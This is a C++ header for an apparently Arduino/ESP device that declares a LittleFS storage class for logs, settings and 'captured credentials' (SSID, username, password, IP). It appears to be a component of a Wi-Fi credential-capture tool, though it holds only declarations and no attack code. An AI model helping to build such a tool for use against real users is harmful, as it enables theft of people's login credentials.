#pragma once
#include <LittleFS.h>
#include <ArduinoJson.h>
#include <time.h>

// LittleFS-based persistent storage
// Saves: captured credentials, logs, settings (PIN, AP name etc)
// All data survives reboots

class CyberStorage {
public:
  bool begin();

  // Credentials
  void saveCred(const String& type, const String& ssid,
                const String& user, const String& pass,
                const String& ip);
  String getCredsJson();
  void   clearCreds();
  int    getCredCount();

  // Logs
  void   addLog(const String& type, const String& msg);
  String getLogsJson();
  void   clearLogs();

  // Settings
  void   saveSetting(const String& key, const String& val);
  String getSetting(const String& key, const String& def="");

  // NTP
  void   syncTime(const String& tz="GMT0BST,M3.5.0/1,M10.5.0");
  String getTimestamp();
  bool   timeReady();

private:
  bool _mounted = false;
  void _ensureDir(const String& path);
};

extern CyberStorage cyberStorage;
